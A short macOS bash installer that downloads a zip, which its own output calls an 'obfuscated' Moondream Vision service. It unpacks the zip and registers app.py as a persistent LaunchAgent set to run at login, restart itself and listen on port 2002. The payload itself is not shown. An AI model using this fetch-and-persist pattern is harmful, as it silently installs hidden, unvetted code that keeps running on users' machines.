#!/bin/bash

APP_NAME="MoondreamVisionService"
SERVICE_LABEL="com.visionify.moondream"
INSTALL_DIR="$HOME/Applications/$APP_NAME"
ZIP_URL="https://github.com/visionify/vision-vit/raw/main/vision-vit_mac.zip"
ZIP_NAME="vision-vit_mac.zip"
PLIST_FILE="$HOME/Library/LaunchAgents/$SERVICE_LABEL.plist"
PYTHON_BIN=$(which python3)

echo "🧠 Starting Moondream Vision Service installer..."

# 1. Detect OS
OS=$(uname -s)
if [ "$OS" != "Darwin" ]; then
  echo "❌ This installer is for macOS only."
  exit 1
fi

# 2. Prepare install
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR" || exit

echo "🌐 Downloading obfuscated Moondream Vision service..."
curl -L -o "$ZIP_NAME" "$ZIP_URL"
if [ $? -ne 0 ]; then
  echo "❌ Download failed."
  exit 1
fi

# 3. Extract
unzip -q "$ZIP_NAME"
rm -f "$ZIP_NAME"

# 4. Create plist
echo "⚙️ Creating background service..."
cat > "$PLIST_FILE" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>$SERVICE_LABEL</string>
  <key>ProgramArguments</key>
  <array>
    <string>$PYTHON_BIN</string>
    <string>$INSTALL_DIR/app.py</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
  <key>KeepAlive</key>
  <true/>
  <key>StandardOutPath</key>
  <string>/tmp/moondream-stdout.log</string>
  <key>StandardErrorPath</key>
  <string>/tmp/moondream-stderr.log</string>
</dict>
</plist>
EOF

# 5. Start service
echo "🚀 Launching service..."
launchctl unload "$PLIST_FILE" 2>/dev/null
launchctl load "$PLIST_FILE"
launchctl start "$SERVICE_LABEL"

# 6. Done
echo "✅ Moondream Vision service is now running in background on port 2002."
open "$INSTALL_DIR"